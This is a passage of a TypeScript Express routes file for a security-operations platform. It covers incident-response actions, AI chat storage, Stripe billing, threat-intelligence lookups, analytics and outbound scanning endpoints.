    } catch (error) {
      res.status(500).json({ error: "Failed to mark all read" });
    }
  });

  // Response actions
  app.post("/api/response/block-ip", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const { ip, reason } = z.object({ ip: z.string(), reason: z.string().default("Manual block") }).parse(req.body);
      const result = await responseEngine.blockIP(orgId, ip, reason, userId);
      res.json(result);
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to block IP" });
    }
  });

  app.post("/api/response/isolate-asset", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const { assetId } = z.object({ assetId: z.number() }).parse(req.body);
      const result = await responseEngine.isolateAsset(orgId, assetId, userId);
      res.json(result);
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to isolate asset" });
    }
  });

  app.post("/api/response/quarantine-file", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const { fileName, fileHash, threat, sourceAsset } = z.object({
        fileName: z.string(), fileHash: z.string().default(""), threat: z.string(), sourceAsset: z.string().default(""),
      }).parse(req.body);
      const result = await responseEngine.quarantineFile(orgId, fileName, fileHash, threat, sourceAsset, userId);
      res.json(result);
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to quarantine file" });
    }
  });

  app.post("/api/response/sinkhole-domain", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const { domain } = z.object({ domain: z.string() }).parse(req.body);
      const result = await responseEngine.sinkholeDomain(orgId, domain, userId);
      res.json(result);
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to sinkhole domain" });
    }
  });

  app.post("/api/response/create-incident-from-event", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const { eventId } = z.object({ eventId: z.number() }).parse(req.body);
      const result = await responseEngine.createIncidentFromEvent(orgId, eventId, userId);
      res.json(result);
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to create incident" });
    }
  });

  app.post("/api/response/execute-playbook", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const { playbookId, context } = z.object({ playbookId: z.number(), context: z.record(z.any()).default({}) }).parse(req.body);
      const result = await responseEngine.executePlaybook(orgId, playbookId, context, userId);
      res.json(result);
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to execute playbook" });
    }
  });

  app.post("/api/response/emergency-lockdown", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const result = await responseEngine.emergencyLockdown(orgId, userId);
      res.json(result);
    } catch (error: any) {
      res.status(500).json({ error: error.message || "Failed to initiate lockdown" });
    }
  });

  app.post("/api/response/auto-defend", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { eventId } = z.object({ eventId: z.number() }).parse(req.body);
      const events = await storage.getSecurityEvents(orgId);
      const event = events.find(e => e.id === eventId);
      if (!event) return res.status(404).json({ error: "Event not found" });
      const result = await responseEngine.autoThreatResponse(orgId, event);
      res.json(result);
    } catch (error: any) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: error.message || "Failed to execute auto-defend" });
    }
  });

  app.get("/api/response/actions", async (req, res) => {
    try {
      const actions = await storage.getResponseActions(getOrgId(req));
      res.json(actions);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch response actions" });
    }
  });

  // AI conversations
  app.get("/api/ai-conversations", async (req, res) => {
    try {
      const convs = await chatStorage.getAllConversations(getOrgId(req));
      res.json(convs);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch conversations" });
    }
  });

  app.get("/api/ai-conversations/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const conv = await chatStorage.getConversation(id);
      if (!conv) return res.status(404).json({ error: "Not found" });
      if (conv.organizationId !== getOrgId(req)) return res.status(404).json({ error: "Not found" });
      const messages = await chatStorage.getMessagesByConversation(id);
      res.json({ ...conv, messages });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch conversation" });
    }
  });

  app.post("/api/ai-conversations", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const conv = await chatStorage.createConversation(req.body.title || "New Analysis", orgId);
      res.status(201).json(conv);
    } catch (error) {
      res.status(500).json({ error: "Failed to create conversation" });
    }
  });

  app.delete("/api/ai-conversations/:id", async (req, res) => {
    try {
      const id = parseInt(req.params.id);
      const conv = await chatStorage.getConversation(id);
      if (!conv || conv.organizationId !== getOrgId(req)) return res.status(404).json({ error: "Not found" });
      await chatStorage.deleteConversation(id);
      res.status(204).send();
    } catch (error) {
      res.status(500).json({ error: "Failed to delete conversation" });
    }
  });

  // Billing
  app.use("/api/billing", requireAuth);

  app.get("/api/billing/config", async (_req, res) => {
    try {
      const publishableKey = await getStripePublishableKey();
      const liveMode = await isStripeLiveMode();
      res.json({ publishableKey, liveMode });
    } catch (error) {
      res.status(500).json({ error: "Stripe not configured" });
    }
  });

  app.get("/api/billing/status", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const org = await storage.getOrganization(orgId);
      if (!org) return res.status(404).json({ error: "Organization not found" });
      let planDetails = null;
      if (org.planId) planDetails = await storage.getPlanById(org.planId);
      const orgAny = org as any;
      res.json({
        plan: org.plan,
        maxUsers: org.maxUsers,
        stripeCustomerId: org.stripeCustomerId,
        stripeSubscriptionId: org.stripeSubscriptionId,
        subscriptionStatus: org.subscriptionStatus,
        subscriptionExpiresAt: orgAny.subscriptionExpiresAt ?? null,
        trialUsed: orgAny.trialUsed ?? false,
        trialStartedAt: orgAny.trialStartedAt ?? null,
        planId: org.planId,
        planDetails,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch billing status" });
    }
  });

  app.post("/api/billing/start-trial", requireAuth, async (req: any, res) => {
    try {
      const orgId = getOrgId(req);
      const org = await storage.getOrganization(orgId);
      if (!org) return res.status(404).json({ error: "Organization not found" });
      const orgAny = org as any;
      if (orgAny.trialUsed) {
        return res.status(400).json({ error: "Your organization has already used its free trial." });
      }
      if (org.subscriptionStatus === "active") {
        return res.status(400).json({ error: "You already have an active subscription." });
      }
      if (org.subscriptionStatus === "trialing") {
        return res.status(400).json({ error: "A trial is already active." });
      }
      const updated = await storage.startOrgTrial(orgId);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: req.user.id,
        action: "start_trial",
        targetType: "organization",
        targetId: String(orgId),
        details: "24-hour free trial started",
      });
      res.json({ ok: true, expiresAt: (updated as any)?.subscriptionExpiresAt });
    } catch (error) {
      res.status(500).json({ error: "Failed to start trial" });
    }
  });

  app.post("/api/billing/create-checkout", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { priceId, planName } = z.object({ priceId: z.string().optional(), planName: z.string() }).parse(req.body);
      const org = await storage.getOrganization(orgId);
      if (!org) return res.status(404).json({ error: "Organization not found" });

      const stripe = await getUncachableStripeClient();

      let customerId = org.stripeCustomerId;
      if (customerId) {
        try {
          await stripe.customers.retrieve(customerId);
        } catch (e: any) {
          if (e?.statusCode === 404 || e?.code === "resource_missing") {
            customerId = null;
          } else {
            throw e;
          }
        }
      }
      if (!customerId) {
        const customer = await stripe.customers.create({
          metadata: { organizationId: String(orgId) },
        });
        customerId = customer.id;
        await storage.updateOrganization(orgId, { stripeCustomerId: customerId });
      }

      const matchedPlan = await storage.getPlanByName(planName);
      if (matchedPlan) {
        await storage.updateOrganization(orgId, { planId: matchedPlan.id, plan: planName } as any);
      }

      let resolvedPriceId = priceId;

      if (!resolvedPriceId) {
        const planPrices: Record<string, number> = {
          starter: 2900,
          professional: 9900,
          enterprise: 29900,
        };
        const planAmount = planPrices[planName];
        if (!planAmount) {
          return res.status(400).json({ error: "Invalid plan name" });
        }

        const displayName = planName.charAt(0).toUpperCase() + planName.slice(1);

        const existingProducts = await stripe.products.search({
          query: `metadata["plan"]:"${planName}"`,
        });

        let productId: string;
        if (existingProducts.data.length > 0) {
          productId = existingProducts.data[0].id;
        } else {
          const product = await stripe.products.create({
            name: `AegisAI360 ${displayName}`,
            description: `AegisAI360 SOC Platform - ${displayName} Plan`,
            metadata: { plan: planName },
          });
          productId = product.id;
        }

        const existingPrices = await stripe.prices.list({
          product: productId,
          active: true,
          type: "recurring",
        });

        const matchingPrice = existingPrices.data.find(p => p.unit_amount === planAmount && p.recurring?.interval === "month");

        if (matchingPrice) {
          resolvedPriceId = matchingPrice.id;
        } else {
          const newPrice = await stripe.prices.create({
            product: productId,
            unit_amount: planAmount,
            currency: "usd",
            recurring: { interval: "month" },
          });
          resolvedPriceId = newPrice.id;
        }
      }

      const session = await stripe.checkout.sessions.create({
        customer: customerId,
        payment_method_types: ['card'],
        line_items: [{ price: resolvedPriceId, quantity: 1 }],
        mode: 'subscription',
        success_url: `https://${req.get('host')}/billing/success?session_id={CHECKOUT_SESSION_ID}`,
        cancel_url: `https://${req.get('host')}/billing/error`,
        metadata: { organizationId: String(orgId), planName: planName || "" },
      });

      res.json({ url: session.url });
    } catch (error: any) {
      const msg = error?.message || String(error);
      console.error("Checkout error:", msg);
      if (msg.includes("connection not found") || msg.includes("X-Replit-Token")) {
        res.status(503).json({ error: "Payment service temporarily unavailable. Please try again in a moment." });
      } else if (error?.type === "StripeInvalidRequestError") {
        res.status(400).json({ error: `Stripe error: ${msg}` });
      } else {
        res.status(500).json({ error: "Failed to create checkout session. Please try again." });
      }
    }
  });

  app.post("/api/billing/confirm", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { sessionId } = z.object({ sessionId: z.string().min(1) }).parse(req.body);
      const org = await storage.getOrganization(orgId);
      if (!org) return res.status(404).json({ error: "Organization not found" });

      const stripe = await getUncachableStripeClient();
      const session = await stripe.checkout.sessions.retrieve(sessionId);
      if (session.payment_status !== "paid" && session.status !== "complete") {
        return res.status(400).json({ error: "Payment not completed" });
      }
      const sessionOrgId = session.metadata?.organizationId;
      if (sessionOrgId && String(orgId) !== sessionOrgId) {
        return res.status(403).json({ error: "Session does not belong to this organization" });
      }

      const updateData: any = { subscriptionStatus: "active" };
      if (session.subscription) {
        try {
          const sub = await stripe.subscriptions.retrieve(session.subscription as string);
          if (sub.current_period_end) {
            updateData.subscriptionExpiresAt = new Date(sub.current_period_end * 1000);
          }
          if (sub.id) updateData.stripeSubscriptionId = sub.id;
        } catch (_) {}
      }
      await storage.updateOrganization(orgId, updateData);
      res.json({ status: "active", expiresAt: updateData.subscriptionExpiresAt?.toISOString() ?? null });
    } catch (error: any) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: "Session ID required" });
      res.status(500).json({ error: "Failed to confirm subscription" });
    }
  });

  app.post("/api/billing/portal", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const org = await storage.getOrganization(orgId);
      if (!org?.stripeCustomerId) {
        return res.status(400).json({ error: "No billing account found. Please subscribe to a plan first." });
      }

      const stripe = await getUncachableStripeClient();
      try {
        await stripe.customers.retrieve(org.stripeCustomerId);
      } catch (e: any) {
        if (e?.statusCode === 404 || e?.code === "resource_missing") {
          await storage.updateOrganization(orgId, { stripeCustomerId: null } as any);
          return res.status(400).json({ error: "Billing account expired. Please subscribe to a new plan." });
        }
        throw e;
      }

      const session = await stripe.billingPortal.sessions.create({
        customer: org.stripeCustomerId,
        return_url: `https://${req.get('host')}/billing`,
      });

      res.json({ url: session.url });
    } catch (error) {
      res.status(500).json({ error: "Failed to create portal session" });
    }
  });

  app.get("/api/billing/products", async (_req, res) => {
    try {
      const { db: drizzleDb } = await import("./db");
      const { sql } = await import("drizzle-orm");
      const result = await drizzleDb.execute(
        sql`SELECT p.id, p.name, p.description, p.metadata,
              pr.id as price_id, pr.unit_amount, pr.currency, pr.recurring
            FROM stripe.products p
            JOIN stripe.prices pr ON pr.product = p.id AND pr.active = true
            WHERE p.active = true
            ORDER BY pr.unit_amount ASC`
      );
      res.json(result.rows);
    } catch (error) {
      res.json([]);
    }
  });

  app.get("/api/plans", async (_req, res) => {
    try {
      const allPlans = await storage.getPlans();
      res.json(allPlans);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch plans" });
    }
  });

  app.get("/api/billing/usage", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const usage = await storage.getUsageForToday(orgId);
      const org = await storage.getOrganization(orgId);
      let plan = null;
      if (org?.planId) plan = await storage.getPlanById(org.planId);
      res.json({ usage: usage || { agentsRegistered: 0, logsSent: 0, commandsExecuted: 0, terminalCommandsExecuted: 0, threatIntelQueries: 0 }, plan });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch usage" });
    }
  });

  app.get("/api/threat-intel/api-status", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const dbKeys = await storage.getThreatIntelKeys(orgId);
      const dbKeyMap = new Map(dbKeys.map(k => [k.service, true]));

      res.json({
        apis: [
          {
            name: "AbuseIPDB",
            service: "abuseipdb",
            envVar: "ABUSEIPDB_API_KEY",
            configured: dbKeyMap.has("abuseipdb") || !!process.env.ABUSEIPDB_API_KEY,
            hasDbKey: dbKeyMap.has("abuseipdb"),
            description: "IP address reputation and abuse reporting",
            setupUrl: "https://www.abuseipdb.com/account/api",
            freeTier: "1,000 lookups/day",
          },
          {
            name: "AlienVault OTX",
            service: "otx",
            envVar: "OTX_API_KEY",
            configured: dbKeyMap.has("otx") || !!process.env.OTX_API_KEY,
            hasDbKey: dbKeyMap.has("otx"),
            description: "Open threat intelligence for IPs, domains, URLs, and hashes",
            setupUrl: "https://otx.alienvault.com/api",
            freeTier: "Unlimited",
          },
          {
            name: "URLScan.io",
            service: "urlscan",
            envVar: "URLSCAN_API_KEY",
            configured: dbKeyMap.has("urlscan") || !!process.env.URLSCAN_API_KEY,
            hasDbKey: dbKeyMap.has("urlscan"),
            description: "URL scanning and website analysis",
            setupUrl: "https://urlscan.io/user/signup",
            freeTier: "50 scans/day",
          },
          {
            name: "Google Safe Browsing",
            service: "google_safe_browsing",
            envVar: "GOOGLE_SAFE_BROWSING_API_KEY",
            configured: dbKeyMap.has("google_safe_browsing") || !!process.env.GOOGLE_SAFE_BROWSING_API_KEY,
            hasDbKey: dbKeyMap.has("google_safe_browsing"),
            description: "URL threat detection for malware, phishing, and unwanted software",
            setupUrl: "https://console.cloud.google.com/apis/library/safebrowsing.googleapis.com",
            freeTier: "10,000 lookups/day",
          },
          {
            name: "MalwareBazaar",
            service: "malwarebazaar",
            envVar: null,
            configured: true,
            hasDbKey: false,
            description: "Malware hash lookup (free, no API key required)",
            setupUrl: "https://bazaar.abuse.ch/",
            freeTier: "Unlimited, no key needed",
          },
        ],
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch API status" });
    }
  });

  app.post("/api/threat-intel/api-keys", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { service, apiKey } = z.object({ service: z.string().min(1), apiKey: z.string().min(1) }).parse(req.body);
      const validServices = ["abuseipdb", "otx", "urlscan", "google_safe_browsing"];
      if (!validServices.includes(service)) return res.status(400).json({ error: "Invalid service name" });
      const key = await storage.upsertThreatIntelKey(orgId, service, apiKey);
      await storage.createAuditLog({ organizationId: orgId, userId: (req.user as any).id, action: "threat_intel_key_updated", targetType: "settings", details: { service } });
      res.json({ service: key.service, configured: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to save API key" });
    }
  });

  app.delete("/api/threat-intel/api-keys/:service", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const service = req.params.service;
      await storage.deleteThreatIntelKey(orgId, service);
      await storage.createAuditLog({ organizationId: orgId, userId: (req.user as any).id, action: "threat_intel_key_removed", targetType: "settings", details: { service } });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete API key" });
    }
  });

  app.post("/api/threat-intel/ip", requireAuth, requirePlanFeature("allowThreatIntel"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { ip } = z.object({ ip: z.string().min(1) }).parse(req.body);
      await storage.incrementUsage(orgId, "threatIntelQueries");
      const dbKey = await storage.getThreatIntelKey(orgId, "abuseipdb");
      const result = await abuseIpdbLookup(ip, dbKey?.apiKey);
      res.json(result);
    } catch (error) {
      res.status(500).json({ error: "IP lookup failed" });
    }
  });

  app.post("/api/threat-intel/otx-lookup", requireAuth, requirePlanFeature("allowThreatIntel"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { indicator, type } = z.object({ indicator: z.string().min(1), type: z.enum(["ip", "domain", "url", "hash"]).default("ip") }).parse(req.body);
      await storage.incrementUsage(orgId, "threatIntelQueries");
      const dbKey = await storage.getThreatIntelKey(orgId, "otx");
      const result = await otxLookup(indicator, type, dbKey?.apiKey);
      res.json(result);
    } catch (error) {
      res.status(500).json({ error: "OTX lookup failed" });
    }
  });

  app.post("/api/threat-intel/urlscan", requireAuth, requirePlanFeature("allowThreatIntel"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { url } = z.object({ url: z.string().min(1) }).parse(req.body);
      await storage.incrementUsage(orgId, "threatIntelQueries");
      const dbKey = await storage.getThreatIntelKey(orgId, "urlscan");
      const result = await urlscanLookup(url, dbKey?.apiKey);
      res.json(result);
    } catch (error) {
      res.status(500).json({ error: "URL scan failed" });
    }
  });

  app.post("/api/threat-intel/safebrowsing", requireAuth, requirePlanFeature("allowThreatIntel"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { url } = z.object({ url: z.string().min(1) }).parse(req.body);
      await storage.incrementUsage(orgId, "threatIntelQueries");
      const dbKey = await storage.getThreatIntelKey(orgId, "google_safe_browsing");
      const result = await safeBrowsingLookup(url, dbKey?.apiKey);
      res.json(result);
    } catch (error) {
      res.status(500).json({ error: "Safe Browsing lookup failed" });
    }
  });

  app.post("/api/threat-intel/hash", requireAuth, requirePlanFeature("allowThreatIntel"), async (req, res) => {
    try {
      const { hash } = z.object({ hash: z.string().min(1) }).parse(req.body);
      await storage.incrementUsage(getOrgId(req), "threatIntelQueries");
      const result = await malwareBazaarLookup(hash);
      res.json(result);
    } catch (error) {
      res.status(500).json({ error: "Hash lookup failed" });
    }
  });

  app.post("/api/threat-intel/enrich", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { ip } = z.object({ ip: z.string().min(1) }).parse(req.body);
      await storage.incrementUsage(orgId, "threatIntelQueries");

      const abuseIpdbKey = await storage.getThreatIntelKey(orgId, "abuseipdb");
      const otxKey = await storage.getThreatIntelKey(orgId, "otx");

      const [abuseResult, otxResult] = await Promise.allSettled([
        abuseIpdbLookup(ip, abuseIpdbKey?.apiKey),
        otxLookup(ip, "ip", otxKey?.apiKey),
      ]);

      const abuseData = abuseResult.status === "fulfilled" ? abuseResult.value : { source: "AbuseIPDB", error: "Lookup failed" };
      const otxData = otxResult.status === "fulfilled" ? otxResult.value : { source: "AlienVault OTX", error: "Lookup failed" };

      const enrichment: any = {
        ip,
        abuseIpdb: abuseData,
        otx: otxData,
        summary: {
          reputationScore: null,
          abuseConfidence: null,
          country: null,
          countryCode: null,
          isp: null,
          domain: null,
          totalReports: null,
          lastReported: null,
          threatTypes: [] as string[],
          pulseCount: null,
        },
      };

      if (abuseData?.data) {
        const d = abuseData.data;
        enrichment.summary.abuseConfidence = d.abuseConfidenceScore ?? null;
        enrichment.summary.reputationScore = d.abuseConfidenceScore != null ? Math.max(0, 100 - d.abuseConfidenceScore) : null;
        enrichment.summary.country = d.countryName ?? null;
        enrichment.summary.countryCode = d.countryCode ?? null;
        enrichment.summary.isp = d.isp ?? null;
        enrichment.summary.domain = d.domain ?? null;
        enrichment.summary.totalReports = d.totalReports ?? null;
        enrichment.summary.lastReported = d.lastReportedAt ?? null;
      }

      if (otxData?.data) {
        enrichment.summary.pulseCount = otxData.data.pulse_info?.count ?? null;
        const pulses = otxData.data.pulse_info?.pulses ?? [];
        const tags = new Set<string>();
        for (const p of pulses.slice(0, 10)) {
          if (p.tags) p.tags.forEach((t: string) => tags.add(t));
        }
        enrichment.summary.threatTypes = Array.from(tags).slice(0, 10);
        if (!enrichment.summary.country && otxData.data.country_name) {
          enrichment.summary.country = otxData.data.country_name;
          enrichment.summary.countryCode = otxData.data.country_code ?? null;
        }
      }

      res.json(enrichment);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Enrichment lookup failed" });
    }
  });

  app.post("/api/analytics/anomaly-detection", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const events = await storage.getSecurityEvents(orgId);
      const recentEvents = events.slice(0, 100);
      const severityCounts = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
      for (const e of recentEvents) (severityCounts as any)[e.severity] = ((severityCounts as any)[e.severity] || 0) + 1;
      const anomalyScore = Math.min(100, severityCounts.critical * 20 + severityCounts.high * 10 + severityCounts.medium * 3);
      const anomalies = [];
      if (severityCounts.critical > 3) anomalies.push({ type: "spike", description: "Unusual spike in critical events", confidence: 0.85 });
      if (recentEvents.length > 50) anomalies.push({ type: "volume", description: "Higher than normal event volume", confidence: 0.7 });
      const sourceIps = new Set(recentEvents.map(e => e.sourceIp).filter(Boolean));
      if (sourceIps.size > 20) anomalies.push({ type: "distributed", description: "Activity from many distinct source IPs", confidence: 0.6 });
      res.json({ anomalyScore, anomalies, severityCounts, eventsAnalyzed: recentEvents.length });
    } catch (error) {
      res.status(500).json({ error: "Anomaly detection failed" });
    }
  });

  app.post("/api/analytics/endpoint-risk-score", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const agentList = await storage.getAgentsByOrg(orgId);
      const scores = agentList.map(a => {
        let risk = 0;
        if (a.status === "offline") risk += 20;
        if (a.cpuUsage && a.cpuUsage > 90) risk += 15;
        if (a.ramUsage && a.ramUsage > 90) risk += 15;
        const hoursSinceLastSeen = (Date.now() - new Date(a.lastSeen).getTime()) / (1000 * 60 * 60);
        if (hoursSinceLastSeen > 24) risk += 30;
        else if (hoursSinceLastSeen > 1) risk += 10;
        return { agentId: a.id, hostname: a.hostname, os: a.os, riskScore: Math.min(100, risk), status: a.status, lastSeen: a.lastSeen };
      });
      const avgRisk = scores.length > 0 ? Math.round(scores.reduce((s, a) => s + a.riskScore, 0) / scores.length) : 0;
      res.json({ endpoints: scores, averageRisk: avgRisk, totalEndpoints: scores.length });
    } catch (error) {
      res.status(500).json({ error: "Risk score calculation failed" });
    }
  });

  app.get("/api/organization/users", requireAuth, async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const orgUsers = await storage.getOrganizationUsers(orgId);
      res.json(orgUsers);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch users" });
    }
  });

  app.patch("/api/organization/users/:userId/role", requireRole("admin"), async (req, res) => {
    try {
      const { userId } = req.params;
      const orgId = getOrgId(req);
      const { role } = z.object({ role: z.enum(["admin", "analyst", "auditor", "readonly"]) }).parse(req.body);
      const updated = await storage.updateUserRole(userId, orgId, role);
      if (!updated) return res.status(404).json({ error: "User not found" });
      await storage.createAuditLog({ organizationId: orgId, userId: getUserId(req), action: "change_role", targetType: "user", targetId: userId, details: `role=${role}` });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update role" });
    }
  });

  app.post("/api/ai-conversations/:id/messages", async (req, res) => {
    try {
      const conversationId = parseInt(req.params.id);
      const { content } = z.object({ content: z.string().min(1) }).parse(req.body);

      const conv = await chatStorage.getConversation(conversationId);
      if (!conv) return res.status(404).json({ error: "Conversation not found" });
      if (conv.organizationId !== getOrgId(req)) return res.status(404).json({ error: "Conversation not found" });

      await chatStorage.createMessage(conversationId, "user", content);

      const messages = await chatStorage.getMessagesByConversation(conversationId);
      const rawMessages = messages.map((m) => ({
        role: m.role as "user" | "assistant",
        content: m.content,
      }));
      const compressed = compressChatHistory(rawMessages, 10, 1500);
      const chatMessages: { role: "system" | "user" | "assistant"; content: string }[] = [
        { role: "system", content: SECURITY_SYSTEM_PROMPT },
        ...compressed,
      ];

      res.setHeader("Content-Type", "text/event-stream");
      res.setHeader("Cache-Control", "no-cache");
      res.setHeader("Connection", "keep-alive");

      const stream = await openai.chat.completions.create({
        model: "gpt-4o-mini",
        messages: chatMessages,
        stream: true,
        max_completion_tokens: 4096,
      });

      let fullResponse = "";
      for await (const chunk of stream) {
        const text = chunk.choices[0]?.delta?.content || "";
        if (text) {
          fullResponse += text;
          res.write(`data: ${JSON.stringify({ content: text })}\n\n`);
        }
      }

      await chatStorage.createMessage(conversationId, "assistant", fullResponse);
      res.write(`data: ${JSON.stringify({ done: true })}\n\n`);
      res.end();
    } catch (error) {
      console.error("AI analysis error:", error);
      if (res.headersSent) {
        res.write(`data: ${JSON.stringify({ error: "Failed to process" })}\n\n`);
        res.end();
      } else {
        res.status(500).json({ error: "Failed to process message" });
      }
    }
  });

  app.post("/api/scan/ports", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target, ports } = z.object({
        target: z.string().min(1),
        ports: z.array(z.number()).optional(),
      }).parse(req.body);
      if (isPrivateTarget(target)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "port_scan",
        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await scanPorts(target, ports);
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.openPorts.length,
          severity: results.riskLevel,
          completedAt: new Date(),
        });
        if (results.openPorts.some(p => p.risk === "high" || p.risk === "critical")) {
          await storage.createSecurityEvent({
            organizationId: orgId,
            eventType: "reconnaissance",
            severity: results.riskLevel,
            source: "Port Scanner",
            sourceIp: target,
            description: `Port scan on ${target}: ${results.openPorts.length} open ports found (${results.openPorts.filter(p => p.risk === "high" || p.risk === "critical").length} high-risk)`,
          });
        }
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/dns", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      if (isPrivateTarget(target)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "dns_lookup",
        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await lookupDNS(target);
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.totalRecords,
          severity: "info",
          completedAt: new Date(),
        });
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/ssl", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      if (isPrivateTarget(target)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "ssl_check",
        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await checkSSL(target);
        let severity = "info";
        if (results.expired) severity = "critical";
        else if (results.selfSigned) severity = "high";
        else if (results.expiringSoon) severity = "medium";
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.expired ? 1 : results.expiringSoon ? 1 : 0,
          severity,
          completedAt: new Date(),
        });
        if (results.expired || results.selfSigned) {
          await storage.createSecurityEvent({
            organizationId: orgId,
            eventType: "anomaly",
            severity,
            source: "SSL Scanner",
            description: `SSL certificate issue on ${target}: ${results.expired ? "Certificate EXPIRED" : "Self-signed certificate"} (Grade: ${results.grade})`,
          });
        }
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/headers", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      if (isPrivateTarget(target)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "header_scan",
        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await scanHeaders(target);
        let severity = "info";
        if (results.score < 40) severity = "high";
        else if (results.score < 60) severity = "medium";
        else if (results.score < 80) severity = "low";
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.findings,
          severity,
          completedAt: new Date(),
        });
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/vulnerabilities", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      if (isPrivateTarget(target)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "vuln_scan",
